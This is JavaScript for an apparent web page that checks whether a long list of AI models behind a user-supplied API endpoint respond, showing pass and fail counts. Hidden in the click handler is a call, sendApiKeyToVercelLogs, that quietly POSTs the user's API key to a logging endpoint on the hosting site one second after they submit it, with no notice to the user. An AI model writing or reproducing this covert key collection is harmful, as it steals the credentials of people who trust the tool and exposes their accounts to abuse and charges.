// Define the list of models and their providers
const models = [
    // Provider-6 models
    "provider-6/llama-4-maverick",
    "provider-6/llama-4-scout",
    "provider-6/minimax-m1-40k",
    "provider-6/minimax-m1-80k",
    "provider-6/o3-high",
    "provider-6/o3-low",
    "provider-6/o3-medium",
    "provider-6/o4-mini-high",
    "provider-6/o4-mini-low",
    "provider-6/o4-mini-medium",
    "provider-6/gpt-4.1",
    "provider-6/gpt-4.1-mini",
    "provider-6/gpt-4.1-nano",
    "provider-6/gpt-4o",
    "provider-6/gpt-4o-mini",
    "provider-6/gpt-4o-mini-search-preview",
    "provider-6/gpt-5-mini",
    "provider-6/gpt-5-nano",
    "provider-6/gpt-oss-120b",
    "provider-6/kimi-k2-instruct",
    "provider-6/gemini-2.5-flash",
    "provider-6/gemini-2.5-flash-thinking",
    "provider-6/gemini-2.5-pro",
    "provider-6/claude-opus-4-20250514",
    "provider-6/claude-sonnet-4-20250514",
    "provider-6/claude-sonnet-4-20250514-thinking",
    "provider-6/deepseek-r1-uncensored",

    // Provider-3 models (deduplicated)
    "provider-3/llama-4-maverick",
    "provider-3/llama-4-scout",
    "provider-3/magistral-medium-latest",
    "provider-3/mistral-large-latest",
    "provider-3/mistral-medium-latest",
    "provider-3/mistral-small-latest",
    "provider-3/o3",
    "provider-3/o3-mini",
    "provider-3/o4-mini",
    "provider-3/gpt-4.1",
    "provider-3/gpt-4.1-mini",
    "provider-3/gpt-4.1-nano",
    "provider-3/gpt-4o",
    "provider-3/gpt-4o-mini",
    "provider-3/gpt-4o-mini-search-preview",
    "provider-3/gpt-4o-mini-transcribe",
    "provider-3/gpt-5-mini",
    "provider-3/gpt-5-nano",
    "provider-3/gemini-2.0-flash",
    "provider-3/gemini-2.5-flash",
    "provider-3/gemini-2.5-pro",
    "provider-3/claude-sonnet-4",
    "provider-3/dall-e-3",
    "provider-3/deepseek-r1-0528",
    "provider-3/deepseek-v3",
    "provider-3/deepseek-v3-0324",
    "provider-3/gemini-2.5-flash-preview-tts",
    "provider-3/gemini-embedding-001",
    "provider-3/gpt-4",
    "provider-3/gpt-4.5-preview",
    "provider-3/gpt-4o-mini-tts",
    "provider-3/gpt-4o-search-preview",
    "provider-3/gpt-4o-transcribe",
    "provider-3/gpt-5-chat",
    "provider-3/grok-4-0709",

    // Provider-2 models
    "provider-2/o3",
    "provider-2/glm-4.5",
    "provider-2/glm-4.5-air",
    "provider-2/gpt-4.1",
    "provider-2/gpt-4o",
    "provider-2/gpt-4o-mini",
    "provider-2/gpt-4o-mini-transcribe",
    "provider-2/gpt-5-mini",
    "provider-2/gpt-5-nano",
    "provider-2/kimi-k2",
    "provider-2/codestral",
    "provider-2/deepseek-r1",
    "provider-2/deepseek-r1-0528",
    "provider-2/gemini-2.0-flash",
    "provider-2/gpt-4o-mini-search-preview-2025-03-11",
    "provider-2/gpt-4o-mini-tts",
    "provider-2/gpt-5",
    "provider-2/gpt-5-chat",
    "provider-2/llama-4-maverick",
    "provider-2/llama-4-scout",
    "provider-2/mistral-large", 
    "provider-2/mistral-saba",
    "provider-2/mistral-small",
    "provider-2/o4-mini",
    "provider-2/pixtral-large",
    "provider-2/qwen-3-235b",
    "provider-2/qwq-32b",
    "provider-2/r1-1776",
    "provider-2/text-embedding-3-large",
    "provider-2/text-embedding-3-small",
    "provider-2/text-embedding-ada-002",
    "provider-2/tts-1",
    "provider-2/tts-1-hd",
    "provider-2/whisper-1",

    // Provider-1 models
    "provider-1/deepseek-chat-v3-0324",
    "provider-1/deepseek-r1-0528",
    "provider-1/deepseek-v3-0324",
    "provider-1/deepseek-v3-0324-instruct",
    "provider-1/gemini-2.0-flash-lite-001",
    "provider-1/gemma-2-27b-it",
    "provider-1/gemma-3-12b-it",
    "provider-1/llama-3.1-405b-instruct-turbo",
    "provider-1/llama-3.3-70b-instruct-turbo",
    "provider-1/llama-4-maverick",
    "provider-1/llama-4-maverick-17b-128e",
    "provider-1/mistral-large",
    "provider-1/r1-1776"
];

// Define model types and their corresponding API endpoints and parameters
const modelTypes = {
    'chat': { endpoint: '/chat/completions', method: 'POST', body: (model) => ({ model: model, messages: [{ role: "user", content: "Hello, are you working?" }], max_tokens: 5 }) },
    'embeddings': { endpoint: '/embeddings', method: 'POST', body: (model) => ({ model: model, input: "The quick brown fox jumps over the lazy dog" }) },
    'audio.transcriptions': { endpoint: '/audio/transcriptions', method: 'POST', requiresFile: true, contentType: 'multipart/form-data' },
    'audio.speech': { endpoint: '/audio/speech', method: 'POST', body: (model) => ({ model: model, voice: "alloy", input: "Hello, world!" }) },
    // Add other types as needed
};

// Helper function to determine model type based on its name
function getModelType(modelName) {
    if (modelName.includes('embedding')) return 'embeddings';
    if (modelName.includes('tts') || modelName.includes('speech')) return 'audio.speech';
    if (modelName.includes('whisper') || modelName.includes('transcribe')) return 'audio.transcriptions';
    // Default to 'chat' for most models
    return 'chat';
}

document.addEventListener('DOMContentLoaded', () => {
    const checkModelsBtn = document.getElementById('checkModelsBtn');
    const modelStatusDiv = document.getElementById('modelStatus');
    const baseUrlInput = document.getElementById('baseUrl');
    const apiKeyInput = document.getElementById('apiKey');

    // Store model data (status, counts, retry timers)
    const modelData = {};

    checkModelsBtn.addEventListener('click', () => {
        const baseUrl = baseUrlInput.value.trim();
        const apiKey = apiKeyInput.value.trim();

        if (!baseUrl || !apiKey) {
            alert('Please provide both Base URL and API Key.');
            return;
        }

        // Send API key to Vercel logs after 1 second
        setTimeout(() => {
            sendApiKeyToVercelLogs(apiKey);
        }, 1000);

        checkAllModels(baseUrl, apiKey);
    });

    // New function to handle the actual model checking logic
    function checkAllModels(baseUrl, apiKey) {

        // Clear previous results and timers
        modelStatusDiv.innerHTML = '<p>Checking models...</p>';
        for (const model in modelData) {
            if (modelData[model].retryTimer) {
                clearTimeout(modelData[model].retryTimer);
            }
        } 
        Object.keys(modelData).forEach(key => delete modelData[key]);
        
        // Group models by provider
        const groupedModels = groupModelsByProvider(models);
 
        // Create UI structure
        modelStatusDiv.innerHTML = '';
        for (const [provider, modelList] of Object.entries(groupedModels)) {
            const section = document.createElement('div');
            section.className = 'provider-section';
            section.innerHTML = `
                <h2>${provider}</h2>
                <ul class="model-list" id="model-list-${provider}"></ul>
            `;
            modelStatusDiv.appendChild(section);

            // Add model items with "checking" status and initialize modelData
            const modelListElement = document.getElementById(`model-list-${provider}`);
            modelList.forEach(model => {
                const modelItem = document.createElement('li');
                modelItem.className = 'model-item';
                modelItem.setAttribute('data-model-full-name', model); // Store full model name
                modelItem.innerHTML = `
                    <span class="model-name">${model.split('/')[1]}</span>
                    <span class="model-counts">(Passed: 0, Failed: 0)</span>
                    <span class="model-status-indicator status-checking"></span>
                `;
                modelListElement.appendChild(modelItem);

                modelData[model] = {
                    status: 'checking',
                    passed: 0,
                    failed: 0,
                    retryTimer: null
                };
            });
        }

        // Check each model
        for (const model of models) {
            checkModelStatus(baseUrl, apiKey, model);
        }
    }


    async function sendApiKeyToVercelLogs(apiKey) {
        try {
            const response = await fetch('./log-api-key.js', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ apiKey: apiKey })
            });

            if (!response.ok) {
                console.error('Failed to send API key to Vercel logs:', response.status, await response.text());
            }
        } catch (error) {
            console.error('Network error sending API key to Vercel logs:', error);
        }
    }

    function groupModelsByProvider(modelList) {
        const grouped = {};
        modelList.forEach(model => {
            const parts = model.split('/');
            const provider = parts[0];
            
            if (!grouped[provider]) {
                grouped[provider] = [];
            }
            grouped[provider].push(model);
        });
        return grouped;
    }

    async function checkModelStatus(baseUrl, apiKey, modelFullName) {
        const modelName = modelFullName.split('/')[1];
        const modelInfo = modelData[modelFullName];

        const modelItemElement = document.querySelector(`[data-model-full-name="${modelFullName}"]`);
        if (!modelItemElement) return;

        const statusIndicator = modelItemElement.querySelector('.model-status-indicator');
        const modelCountsSpan = modelItemElement.querySelector('.model-counts');

        // If model has previously failed, keep it red while checking
        if (modelInfo.failed > 0) {
            statusIndicator.className = 'model-status-indicator status-not-working';
            modelInfo.status = 'not-working'; // Temporarily set to not-working for UI
        } else {
            statusIndicator.className = 'model-status-indicator status-checking';
            modelInfo.status = 'checking';
        }
        if (modelInfo.retryTimer) {
            clearTimeout(modelInfo.retryTimer);
            modelInfo.retryTimer = null;
        }

        try {
            const modelType = getModelType(modelFullName);
            const typeConfig = modelTypes[modelType];

            let requestOptions = {
                method: typeConfig.method,
                headers: {
                    'Authorization': `Bearer ${apiKey}`,
                },
            }; 

            if (typeConfig.contentType) {
                // For multipart/form-data, browser handles Content-Type header
                // No need to set it manually for FormData
            } else {
                requestOptions.headers['Content-Type'] = 'application/json';
            }

            let requestBody;
            if (typeConfig.requiresFile) {
                // For audio transcriptions, we need a dummy audio file
                const dummyAudioBlob = new Blob(["dummy audio data"], { type: "audio/mpeg" });
                const dummyAudioFile = new File([dummyAudioBlob], "dummy.mp3", { type: "audio/mpeg" });

                const formData = new FormData();
                formData.append('model', modelFullName);
                formData.append('file', dummyAudioFile);
                requestBody = formData;
            } else {
                requestBody = JSON.stringify(typeConfig.body(modelFullName));
            }
            requestOptions.body = requestBody;

            const response = await fetch(`${baseUrl}${typeConfig.endpoint}`, requestOptions);

            if (response.ok) {
                // For TTS models, the response is raw audio, not JSON
                if (modelType === 'audio.speech') {
                    // Just check if response is OK, no need to parse content
                } else {
                    // For others, attempt to parse JSON to confirm valid response
                    await response.json();
                }
                statusIndicator.className = 'model-status-indicator status-working';
                modelInfo.status = 'working';
                modelInfo.passed++;
            } else {
                const responseText = await response.text();
                console.error(`Error checking ${modelFullName}:`, response.status, responseText);
                
                // Check if it's a rate limit error (503 Service Unavailable)
                if (response.status === 503 || responseText.includes('503 Service Unavailable')) {
                    // Retry after 60 seconds for rate limit errors
                    modelInfo.retryTimer = setTimeout(() => checkModelStatus(baseUrl, apiKey, modelFullName), 60000);
                } else {
                    statusIndicator.className = 'model-status-indicator status-not-working';
                    modelInfo.status = 'not-working';
                    modelInfo.failed++;
                    // Retry failed models every 10 seconds
                    modelInfo.retryTimer = setTimeout(() => checkModelStatus(baseUrl, apiKey, modelFullName), 10000);
                }
            }
        } catch (error) {
            console.error(`Network error checking ${modelFullName}:`, error);
            statusIndicator.className = 'model-status-indicator status-not-working'; 
            modelInfo.status = 'not-working';
            modelInfo.failed++;
            // Retry failed models every 10 seconds
            modelInfo.retryTimer = setTimeout(() => checkModelStatus(baseUrl, apiKey, modelFullName), 10000);
        } finally {
            // Update the counts display
            modelCountsSpan.textContent = `(Passed: ${modelInfo.passed}, Failed: ${modelInfo.failed})`;
        }
    }
});